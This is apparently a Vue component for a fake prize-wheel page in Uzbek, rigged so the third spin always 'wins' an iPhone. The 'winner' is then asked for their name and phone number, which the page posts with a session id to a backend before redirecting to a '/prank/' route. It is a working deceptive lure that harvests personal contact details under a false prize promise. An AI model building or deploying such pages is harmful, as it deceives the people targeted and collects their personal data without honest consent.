<script>
import axios from "axios";

export default {
  data() {
    return {
      prizes: ['Yutuqsiz', 'Yutuqsiz', 'Yutuqsiz', '📱 Iphone 17 Pro Max'],
      currentPrize: '🎰',
      session_id:null,
      attemptsLeft: 3,
      spinning: false,
      rotation: 0,
      showForm: false,
      user: {
        name: '',
        phone: ''
      }
    }
  },
  mounted() {
    if (!this.$route.params.id) {
      this.$router.push('/')
    }else {
      this.session_id = this.$route.params.id;
    }
  },
  methods: {
    spin() {
      if (this.spinning || this.attemptsLeft === 0) return

      this.spinning = true
      this.attemptsLeft--
      this.rotation += 1080 + Math.floor(Math.random() * 360)

      setTimeout(() => {
        if (this.attemptsLeft === 0) {
          this.currentPrize = '📱 Iphone 17 Pro Max'
          this.showForm = true
        } else {
          const i = Math.floor(Math.random() * (this.prizes.length - 1))
          this.currentPrize = this.prizes[i]
        }
        this.spinning = false
      }, 2200)
    },
    submitForm() {
      const uzRegex = /^\+998(33|50|55|71|77|88|90|91|93|94|95|97|98|99)\d{7}$/

      if (!this.user.name || !uzRegex.test(this.user.phone)) {
        alert('Telefon raqam noto‘g‘ri. Masalan: +998 90 123 45 67')
        return
      }


      axios.post(
          `${import.meta.env.VITE_BACKEND_API}/api/phone`,
          {
            phone: this.user.phone,
            name: this.user.name,
            session_id: this.$route.params.id,
          }
      )

      this.redirect()
    },
    onPhoneInput(e) {
      let value = e.target.value

      // +998 ni majburiy qoldiramiz
      if (!value.startsWith('+998')) {
        value = '+998'
      }

      // faqat raqamlarni qoldiramiz (+ dan tashqari)
      value = '+998' + value
          .replace(/\D/g, '')
          .replace(/^998/, '')
          .slice(0, 9)

      this.user.phone = value
    },
    redirect() {
      this.$router.push(`/prank/${this.session_id}`)
    }
  }
}
</script>

<template>
  <div class="page">
    <div class="card">
      <h1>🎁 Sovrinli o‘yin</h1>
      <p class="subtitle">Barabanni aylantiring va sovrin yuting!</p>

      <div
          class="wheel"
          :style="{ transform: `rotate(${rotation}deg)` }"
      >
  <span
      class="prize-text"
      :style="{ transform: `rotate(${-rotation}deg)` }"
  >
    {{ currentPrize }}
  </span>
      </div>

      <p class="attempts">
        🔄 Urinishlar: {{ attemptsLeft }}
      </p>

      <button
          v-if="!showForm"
          @click="spin"
          :disabled="spinning || attemptsLeft === 0"
          class="spin-btn"
      >
        🎰 Aylantirish
      </button>

      <!-- 🧾 Forma -->
      <div v-if="showForm" class="form">
        <h2>🏆 Siz telefon yutdingiz!</h2>

        <input
            v-model="user.name"
            type="text"
            placeholder="Ismingiz"
        />

        <input
            type="tel"
            v-model="user.phone"
            placeholder="+998 XX XXX XX XX"
            @input="onPhoneInput"
            maxlength="13"
        />

        <button @click="submitForm" class="submit-btn">
          📩 Yuborish
        </button>
      </div>
    </div>
  </div>
</template>

<style>
.page {
  min-height: 100vh;
  background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
  display: flex;
  align-items: center;
  justify-content: center;
}

.card {
  background: rgba(255, 255, 255, 0.1);
  backdrop-filter: blur(12px);
  border-radius: 20px;
  padding: 30px;
  width: 360px;
  text-align: center;
  color: #fff;
  box-shadow: 0 0 30px rgba(0, 255, 255, 0.3);
}

.subtitle {
  opacity: 0.8;
  margin-bottom: 20px;
}

.wheel {
  width: 220px;
  height: 220px;
  margin: 20px auto;
  border-radius: 50%;
  border: 6px solid #00fff0;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 28px;
  background: radial-gradient(circle, #ffffff, #c2fefe);
  color: #000;
  transition: transform 2.2s cubic-bezier(0.17, 0.67, 0.12, 0.99);
  box-shadow: 0 0 25px #00fff0;
}

.attempts {
  margin: 10px 0;
}

.spin-btn,
.submit-btn {
  width: 100%;
  padding: 14px;
  margin-top: 15px;
  font-size: 16px;
  border: none;
  border-radius: 12px;
  cursor: pointer;
  background: linear-gradient(90deg, #00fff0, #00c3ff);
  color: #000;
  font-weight: bold;
}

.spin-btn:disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

.form {
  margin-top: 20px;
}

.form input {
  width: 100%;
  padding: 12px;
  margin-top: 10px;
  border-radius: 10px;
  border: none;
  outline: none;
  font-size: 14px;
}

.form input[type="tel"] {
  color: #ffffff; /* yozuv oq */
  background: rgba(255, 255, 255, 0.15);
  border: 1px solid rgba(0, 255, 240, 0.6);
  box-shadow: 0 0 10px rgba(0, 255, 240, 0.4);
}

.form input[type="tel"]::placeholder {
  color: rgba(255, 255, 255, 0.6); /* placeholder ham och oq */
}

.form input[type="tel"]:focus {
  outline: none;
  border-color: #00fff0;
  box-shadow: 0 0 15px rgba(0, 255, 240, 0.9);
}

.form input[type="text"] {
  color: #ffffff; /* yozuv oq */
  background: rgba(255, 255, 255, 0.15);
  border: 1px solid rgba(0, 255, 240, 0.6);
  box-shadow: 0 0 10px rgba(0, 255, 240, 0.4);
}

.form input[type="text"]::placeholder {
  color: rgba(255, 255, 255, 0.6); /* placeholder ham och oq */
}

.form input[type="text"]:focus {
  outline: none;
  border-color: #00fff0;
  box-shadow: 0 0 15px rgba(0, 255, 240, 0.9);
}
</style>
